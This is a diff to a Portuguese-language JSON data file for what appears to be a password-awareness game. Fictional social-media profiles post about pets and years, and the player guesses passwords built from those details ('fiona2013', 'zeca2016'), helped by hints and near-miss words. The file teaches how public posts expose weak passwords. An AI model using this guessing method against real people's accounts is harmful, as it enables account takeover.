+          "senha": "fiona2013",
+          "partes": [
+            {
+              "trecho": "fiona",
+              "certo": "o nome da tartaruga está certo",
+              "falta": "falta o nome certo"
+            },
+            {
+              "trecho": "2013",
+              "certo": "o ano está certo",
+              "falta": "falta o ano certo"
+            }
+          ],
+          "mornos": [
+            "tartaruga",
+            "livro",
+            "maratona",
+            "2022",
+            "karaoke",
+            "sexta"
+          ]
+        },
+        {
+          "quem": "beto",
+          "usuario": "@beto.backup",
+          "seguidores": "650 seguidores",
+          "icone": "B",
+          "posts": [
+            {
+              "icone": "🦜",
+              "texto": "O Louro Zeca aprendeu a assobiar o hino. Está comigo desde 2016."
+            },
+            {
+              "icone": "🎮",
+              "texto": "Zerei de novo meu jogo favorito de 1998."
+            },
+            {
+              "icone": "⛰️",
+              "texto": "Trilha na Chapada com a família, todo feriado."
+            },
+            {
+              "icone": "☕",
+              "texto": "Café passado na hora, sempre às 6 da manhã."
+            }
+          ],
+          "senha": "zeca2016",
+          "partes": [
+            {
+              "trecho": "zeca",
+              "certo": "o nome do papagaio está certo",
+              "falta": "falta o nome certo"
+            },
+            {
+              "trecho": "2016",
+              "certo": "o ano está certo",
+              "falta": "falta o ano certo"
+            }
+          ],
+          "mornos": [
+            "louro",
+            "hino",
+            "1998",
+            "chapada",
+            "trilha",
+            "cafe"
+          ]
+        }
+      ]
     }
   ]
 }
